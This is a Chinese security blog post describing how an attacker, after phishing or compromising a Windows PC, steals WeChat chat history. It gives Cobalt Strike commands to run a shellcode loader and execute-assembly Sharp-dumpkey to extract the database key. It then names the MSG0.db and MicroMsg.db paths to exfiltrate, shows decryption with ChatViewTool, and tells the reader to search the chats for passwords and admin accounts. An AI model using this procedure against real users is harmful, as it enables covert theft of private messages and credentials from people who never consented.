---
title: 钓鱼场景下微信聊天记录回传
url: https://www.secpulse.com/archives/199362.html
source: 安全脉搏
date: 2023-04-22
fetch_date: 2025-10-04T11:32:12.251004
---

# 钓鱼场景下微信聊天记录回传

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 钓鱼场景下微信聊天记录回传

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[TideSec](https://www.secpulse.com/newpage/author?author_id=26366)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2023-04-21

14,828

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199362-1682057574.png)

## 一、使用场景

钓鱼攻击（通过钓鱼 / 微信控到的机器通常都是登录状态）

渗透到运维机器（有些运维机器会日常登录自己的微信）

实战中钓鱼时常在微信聊天记录中找到目标内网系统账号、机器账号密码，尽可能的不触发大量扫描告警下在内网中精准打到跳板机。

## 二、获取微信聊天记录过程

在第一步需要用到，Sharp-dumpkey工具，下面对**Sharp-dumpkey工具进行介绍**：

基于C#实现的获取微信数据库密钥的小工具，可配合chatViewTool使用。可直接执行命令.dumpkey.exe,查看微信数据库密钥，并回传DBpass.bin文件中。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199362-1682057575.png "null")
![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199362-1682057578.png "null")

* • 暂时不支持微信多开场景的密钥获取。
* • 需微信登录后才可抓取密钥。
* • 程序未采用动态获取基址的方式，因此为保证程序可用性，运行时会在线拉取基址。

在被获取权限PC端执行 .co.exe shellcode -f .cece.txt，可连接到CS服务器

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199362-1682057580.png)

在被获取权限PC处，右键选择Interact，可进入命令执行

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199362-1682057581.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199362-1682057582.png)

#### 1、获取微信数据库密钥，执行命令execute-assembly C:UserssummerDesktoptestdumpkey.exe

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199362-1682057584.png "null")

回传 DBpass.bin，该文件中记录了微信数据库密钥

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199362-1682057586.png "null")

#### 2、下载目标聊天数据库文件，默认保存目录在以下目录，超出 240MB 会自动生成 MSG1.db，以此类推。

C:UserssummerDocumentsWeChat Fileswxid\_vd0nxyv6n20t22MsgMultiMSG0.db C:UserssummerDocumentsWeChat Fileswxid\_vd0nxyv6n20t22MsgMicroMsg.db

**备注：** MSG0.db文件存放聊天记录 MicroMsg.db文件存放好友列表

执行命令shell C:UserssummerDesktoptestFileSearch.exe search C: MSG，可找到文件MSG0.

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199362-1682057587.png)

连接被获取权限PC的文件夹，找到目录C:UserssummerDocumentsWeChat Fileswxid\_vd0nxyv6n20t22MsgMulti，下载文件MSG0.db并存放到自定义目录即可

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199362-1682057589.png)

找到目录C:UserssummerDocumentsWeChat Fileswxid\_vd0nxyv6n20t22Msg，下载文件MicroMsg.db并存放到自定义目录（与MSG0.db放到同一目录下）

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199362-1682057590.png)

在第3步之前对**ChatViewTool工具进行介绍**：

ChatViewTool是一个配合dumpkey(微信数据库秘钥获取工具)使用的小工具，该工具实现了微信数据库解密以及展示数据库聊天记录的功能。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199362-1682057591.png "null")

**使用方法** 在获取数据库秘钥之后将内容保存为文本文件DBPass.Bin，随后提取以下相关的数据库放于秘钥文件同目录。C:UserssummerDocumentsWeChat Fileswxid\_vd0nxyv6n20t22MsgMultiMSG0.db

C:UserssummerDocumentsWeChat Fileswxid\_vd0nxyv6n20t22MsgMicroMsg.db

随后打开ChatViewTool点击“数据库解密”并选择秘钥及数据库所在的目录，待解密完成后

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199362-1682057593.png "null")

点击“查看数据库”选择同目录即可完成会话展示，双击联系人列表可展示对应的聊天记录

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199362-1682057594.png "null")
![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199362-1682057596.png "null")

#### 3、将上面DBpass.bin、MSG0.db、MicroMsg.db三个文件回传到同目录，配合 ChatViewTool 打开解密即可查看，在搜索处 “administrator” “root” “密码” “ip 等”，项目地址。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199362-1682057597.png "null")

## 三、下载

本文中所涉及工具已在知识星球同步，可在知识星球下载（公众号：Tide安全团队）。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199362-1682057599.png)

E

N

D

**本文作者：[TideSec](newpage/author?author_id=26366)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/199362.html**](https://www.secpulse.com/archives/199362.html)

Tags: [ChatViewTool工具](https://www.secpulse.com/archives/tag/chatviewtool%E5%B7%A5%E5%85%B7)、[CS](https://www.secpulse.com/archives/tag/cs)、[Sharp-dumpkey工具](https://www.secpulse.com/archives/tag/sharp-dumpkey%E5%B7%A5%E5%85%B7)、[命令执行](https://www.secpulse.com/archives/tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)、[微信](https://www.secpulse.com/archives/tag/%E5%BE%AE%E4%BF%A1)、[钓鱼攻击](https://www.secpulse.com/archives/tag/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB)

点赞：
1
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![如何复现网传微信csv注入漏洞？](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/1683601873856-300x176.png)

  如何复现网传微信csv注入漏洞？](https://www.secpulse.com/archives/200060.html "详细阅读 如何复现网传微信csv注入漏洞？")
* [![一次getshell并连接内网主机过程](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/1683535109536-300x206.png)

  一次getshell并连接内网主机过程](https://www.secpulse.com/archives/200003.html "详细阅读 一次getshell并连接内网主机过程")
* [![WECHAT二维码闪退分析](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/04/1683184162259-300x201.png)

  WECHAT二维码闪退分析](https://www.secpulse.com/archives/199777.html "详细阅读 WECHAT二维码闪退分析")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/43b12cc12b9dbbe6a010c40d69088feb-300x298.png)](https://www.secpulse.com/newpage/author?author_id=26366aaa) | [TideSec ![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)](...